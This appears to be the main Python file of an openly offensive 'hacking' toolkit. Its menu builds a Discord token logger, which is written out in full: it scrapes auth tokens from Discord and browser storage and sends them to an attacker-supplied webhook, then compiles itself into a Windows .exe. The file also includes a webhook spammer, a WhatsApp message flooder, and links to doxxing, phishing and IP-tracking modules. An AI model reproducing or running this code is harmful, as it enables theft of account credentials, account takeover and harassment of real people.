from colorama import Fore
import os
import shutil
import time
import requests
import random
import platform
import keyboard
import webbrowser
from core import doxxing, goldenphish, ser, scanner

local_version = "1.0.1"

def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def spam():
  clear()
  print(f"""{Fore.GREEN}
██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗    ███████╗██████╗  █████╗ ███╗   ███╗
██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝    ██╔════╝██╔══██╗██╔══██╗████╗ ████║
██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝     ███████╗██████╔╝███████║██╔████╔██║
██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗     ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║
╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗    ███████║██║     ██║  ██║██║ ╚═╝ ██║
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝
  """)
  try:
    webhook = input('\n[+] Enter the link for the webhook: ')
    mensaje = input('[+] Enter the message you want to send in the webhook: ')
    while True:
      requests.post(webhook, json={'username': 'Spammer', 'content': mensaje})
      print('\n[~] Sending message...')
  except KeyboardInterrupt:
    print('\n[~] Stopping spam...')
    time.sleep(1)
    menu()

def tools():
   clear()
   print(f"""{Fore.BLUE}
                         ███      ▄██████▄   ▄██████▄   ▄█          ▄████████ 
                     ▀█████████▄ ███    ███ ███    ███ ███         ███    ███ 
                        ▀███▀▀██ ███    ███ ███    ███ ███         ███    █▀  
                         ███   ▀ ███    ███ ███    ███ ███         ███        
                         ███     ███    ███ ███    ███ ███       ▀███████████ 
                         ███     ███    ███ ███    ███ ███                ███ 
                         ███     ███    ███ ███    ███ ███▌    ▄    ▄█    ███ 
                        ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██  ▄████████▀  
                                  ▀                      
    |------------------------------------------------------------------------------------------|
    |                                                                                          |    
    | [1] Doxxing Tools                                                                        |
    | [2] Phishing Tools                                                                       |
    | [00] Return to main menu                                                          |
    | [99] Quit                                                                               |
    |------------------------------------------------------------------------------------------|
   """)
   a = input('\nroot@fuckyou:~# ')
   if a == "1":
      doxxing.doxxer()
   elif a == "2":
     goldenphish.phish()
   elif a == "00":
     menu()
   elif a == "99":
     exit()
   else:
      print(f'\n{Fore.RED}[!] Error invalid option.')
      time.sleep(2)
      tools()

def creds():
  clear()
  print(f'''{Fore.MAGENTA}
                      ______   _        _     __   __          _ 
                      |  ___/\| |/\    | |    \ \ / /         | |
                      | |_  \ ` ' / ___| | __  \ V /___  _   _| |
                      |  _||_     _/ __| |/ /   \ // _ \| | | | |
                      | |   / , . \ (__|   <    | | (_) | |_| |_|
                      \_|   \/|_|\/\___|_|\_\   \_/\___/ \__,_(_)
                      -------------------------------------------------|
                      |              |    CREDITOS   |                 |
                      |              |---------------|                 |
                      |                                                |
                      | [~] Fuck You hecho por:                        |
                      |                                                |
                      |   [$] Spyk3r                                   |
                      |   Discord:                                     |
                      |   ! Spyk3r#0614                                |
                      |   Twitter:                                     |
                      |   https://twitter.com/_Spyk33r_                |
                      |   Github:                                      |
                      |   https://github.com/Spyk3r                    |
                      |                                                |
                      |   [$] Euronymou5                               |
                      |   Discord:                                     |
                      |   Euronymou5#3155                              |
                      |   Twitter:                                     |
                      |   https://twitter.com/Euronymou51              |
                      |   Github:                                      |
                      |   https://github.com/Euronymou5                |
                      |------------------------------------------------|
  ''')
  input('\n[~] Press enter to continue...')
  menu()

def tracker():
  if os.name == "nt":
    os.system("python track/omega.py")
  else:
    os.system("python3 track/omega.py")

def waspam():
    clear()
    print(f"""{Fore.MAGENTA}
 __          ___           _                                          _             
 \ \        / / |         | |         /\                             | |            
  \ \  /\  / /| |__   __ _| |_ ___   /  \   _ __  _ __    _ __  _   _| | _____ _ __ 
   \ \/  \/ / | '_ \ / _` | __/ __/ / /\ \ | '_ \| '_ \  | '_ \| | | | |/ / _ \ '__|
    \  /\  /  | | | | (_| | |_\__ \/ ____ \| |_) | |_) | | | | | |_| |   <  __/ |   
     \/  \/   |_| |_|\__,_|\__|___/_/    \_\ .__/| .__/  |_| |_|\__,_|_|\_\___|_|   
                                           | |   | |                                
                                           |_|   |_|                               
    """)
    print('\n[~] Opening whatsapp...')
    webbrowser.open_new_tab('https://web.whatsapp.com/')
    input(f'\n{Fore.YELLOW}[~] Once inside WhatsApp web, scan the QR code and press enter...')
    mensaje = input(f'\n{Fore.BLUE}[~] Enter the message you want to send: ')
    if mensaje == "" or mensaje == " ":
        print(f'\n{Fore.RED}[!] Error you must enter a message.')
        time.sleep(3)
        waspam()
    else:
        cantidad = int(input(f'\n{Fore.BLUE}[~] Enter the number of messages you want to send: '))
        if cantidad == 0:
            print(f'\n{Fore.RED}[!] Error you must enter an amount.')
            time.sleep(3)
            waspam()
        elif cantidad <= 0:
           print(f'\n{Fore.RED}[!] Error you must enter a correct amount.')
           time.sleep(3)
           waspam()
        else:
            print('\n[~] The message will be sent in 5 seconds, remember to enter the chat you want to nuke...')
            time.sleep(5)
            for _ in range(cantidad):
                print('\n[~] Sending message...')
                keyboard.write(mensaje)
                keyboard.press_and_release('enter')
            menu()


def tokenlogger():
    clear()
    print(f"""{Fore.LIGHTBLUE_EX}
████████  ██████  ██   ██ ███████ ███    ██ ██       ██████   ██████   ██████  ███████ ██████  
   ██    ██    ██ ██  ██  ██      ████   ██ ██      ██    ██ ██       ██       ██      ██   ██ 
   ██    ██    ██ █████   █████   ██ ██  ██ ██      ██    ██ ██   ███ ██   ███ █████   ██████  
   ██    ██    ██ ██  ██  ██      ██  ██ ██ ██      ██    ██ ██    ██ ██    ██ ██      ██   ██ 
   ██     ██████  ██   ██ ███████ ██   ████ ███████  ██████   ██████   ██████  ███████ ██   ██
    """)
    if os.path.isfile('logger.py'):
        os.remove('logger.py')
    else:
        pass
    variable_hook = input(f'\n{Fore.GREEN}[~] Enter Your Discord WebHook: ')
    f = open('logger.py', 'w')
    f.write('''import os
if os.name != "nt":
    exit()
import os
import re
import json
from urllib.request import Request, urlopen

WEBHOOK = 'webnook'

PING_ME = True

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + r'\\Discord',
        'Discord Canary': roaming + r'\\discordcanary',
        'Discord PTB': roaming + r'\\discordptb',
        'Google Chrome': local + r'\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + r'\\Opera Software\\Opera Stable',
        'Brave': local + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + r'\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()'''.replace("webnook", variable_hook))
    f.close()
    print(f'\n{Fore.YELLOW}[~] Compiling token logger...')
    time.sleep(2)
    print(f'\n{Fore.YELLOW}[~] Detecting os...')
    if platform.system() == "Linux":
        print(
            f'\n{Fore.RED}[✘] It is not possible to compile an .exe for linux. Aborting...'
        )
        time.sleep(2)
        menu()
    elif platform.system() == "Darwin":
        print(
            f'\n{Fore.RED}[✘] It is not possible to compile an .exe for MAC OS. Aborting...'
        )
        time.sleep(2)
        menu()
    elif platform.system() == "Windows":
        print(f'\n[✔] OS Detected: Windows')
        ques = input('\n[?] Do you want to add an icon to your .exe? [Y/n]: ')
        if ques == "Y" or ques == "y":
            print('\n[~] Example: C:\\Users\\Desktop\\icon.ico')
            icon = input('\n[~] Enter the location of your .ico file: ')
            if len(icon) == 0:
                print(f'\n{Fore.RED}[✘] Error you must enter a location.')
                time.sleep(2)
                menu()
            else:
                os.system(f'pyinstaller --onefile --icon="{icon}" logger.py')
                print(
                    f'\n{Fore.GREEN}[✔] Token logger compiled successfully.')
                os.remove("logger.spec")
                shutil.rmtree('build')
                shutil.move("dist/logger.exe", "output")
                shutil.rmtree('dist')
                print(f'{Fore.GREEN}\n[~] Token logger moved to folder: output/logger.exe')
                time.sleep(3)
                menu()
        elif ques == "N" or ques == "n":
            print('\n[~] Converting token logger to exe...')
            os.system("pyinstaller -y -F logger.py")
            print(f'\n{Fore.GREEN}[✔] Token logger successfully compiled.')
            time.sleep(5)
            os.remove("logger.spec")
            shutil.rmtree('build')
            shutil.move("dist/logger.exe", "output")
            shutil.rmtree('dist')
            print(f'{Fore.GREEN}\n[~] Token logger moved to folder: output/logger.exe')
            time.sleep(3)
            menu()
        else:
            print(f'{Fore.RED}[✘] Error invalid option.')
            time.sleep(2)
            menu()
    else:
        print(f'{Fore.RED}[!] Error, Unkown OS!')
        time.sleep(2)
        menu()

def gen():
    clear()
    print(f"""{Fore.LIGHTCYAN_EX}
....................../´¯/)             
....................,/¯../
.................../..../
............./´¯/'...'/´¯¯`·¸
........../'/.../..../......./¨¯\\
........('(...´...´.... ¯~/'...')
.........\.................'...../
..........''...\.......... _.·´
............\..............(
..............\.............\...
    """)
    tam = int(input(f'\n{Fore.YELLOW}[~] Enter the password length (Max 77): '))
    if tam == 77:
        print(f'\n{Fore.RED}[!] Error the password can only be less than 77.')
        time.sleep(3)
        gen()
    elif tam <= 77:
       caracter = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&*(){}[]/\?!@#$abcdefghijklmnopqrstuvwxyz"
       contra = "".join(random.sample(caracter, tam))
       print(f'\n{Fore.GREEN}[~] Contraseña generada: {contra}')
       input(f'\n{Fore.LIGHTCYAN_EX}[~] Press enter to continue...')
       menu()
    elif tam >= 77:
        print(f'\n{Fore.RED}[!] Error password can only be less than 77 in length.')
        time.sleep(3)
        gen()


def menu():
    clear()
    print(f'''{Fore.LIGHTCYAN_EX}
                      ______   _        _     __   __          _ 
                      |  ___/\| |/\    | |    \ \ / /         | |
                      | |_  \ ` ' / ___| | __  \ V /___  _   _| |
                      |  _||_     _/ __| |/ /   \ // _ \| | | | |
                      | |   / , . \ (__|   <    | | (_) | |_| |_|
                      \_|   \/|_|\/\___|_|\_\   \_/\___/ \__,_(_)
                                              v1.0.1 by: Euronymou5 and Spyk3r{Fore.LIGHTBLUE_EX} 
  |-----------------------------------------------------------------------------------------------------------------|
  |                                           |     MENU      |                                                     |
  |                                           |---------------|                                                     |
  |                                                                                                                 |
  |________________$$$$$                            [1] Token Logger Creator discord                                |
  |______________$$____$$                           [2] IP Tracker                                                  |
  |______________$$____$$                           [3] WebHook Spam Discord                                        |
  |______________$$____$$                           [4] Tools Installer                                             |
  |______________$$____$$                           [5] User Searcher                                               |
  |______________$$____$$                           [6] Scanner Con Nmap                                            |  
  |__________$$$$$$____$$$$$$                       [7] Generate Passwords                                         |
  |________$$____$$____$$____$$$$                   [8] WhatsApp Nuker                                              |
  |________$$____$$____$$____$$__$$                 [00] Credits                                                   |
  |$$$$$$__$$____$$____$$____$$____$$               [98] Update Checker                                             |
  |$$____$$$$________________$$____$$               [99] Quit                                                      |
  |$$______$$______________________$$                                                                               |
  |__$$____$$______________________$$                                                                               |
  |___$$$__$$______________________$$                                                                               |
  |____$$__________________________$$                                                                               |
  |_____$$$________________________$$                                                                               |
  |______$$______________________$$$                                                                                |
  |_______$$$____________________$$                                                                                 |
  |________$$____________________$$                                                                                 |
  |_________$$$________________$$$                                                                                  |
  |__________$$________________$$                                                                                   |
  |__________$$$$$$$$$$$$$$$$$$$$                                                                                   |
  |-----------------------------------------------------------------------------------------------------------------|
  ''')
    prompt = input(f'\n{Fore.RESET}root@fuckyou:~# ')
    if prompt == "1":
        tokenlogger()
    elif prompt == "2":
        tracker()
    elif prompt == "3":
        spam()
    elif prompt == "4":
        tools()
    elif prompt == "5":
        ser.ser_menu()
    elif prompt == "6":
        scanner.scan()
    elif prompt == "7":
        gen()
    elif prompt == "8":
        waspam()
    elif prompt == "00":
        creds()
    elif prompt == "98":
        version = requests.get('https://github.com/Euronymou5/FuckYou/raw/main/version.txt')
        if version.status_code == 200:
            c = version.text
            ola = c.strip()
            if local_version == ola:
                print(f'\n{Fore.GREEN}[~] No versions available.')
                input(f'\n{Fore.LIGHTCYAN_EX}[~] Press enter to continue...')
                menu()
            else:
                print(f'\n{Fore.GREEN}[~] A new version is available: {ola}')
                m = input(f'\n{Fore.LIGHTCYAN_EX}[~] Press enter to continue...')
                menu()
    elif prompt == "99":
        exit()
    else:
        print(f'\n{Fore.RED}[!] Error invalid Opion.')
        time.sleep(2)
        menu()

menu()
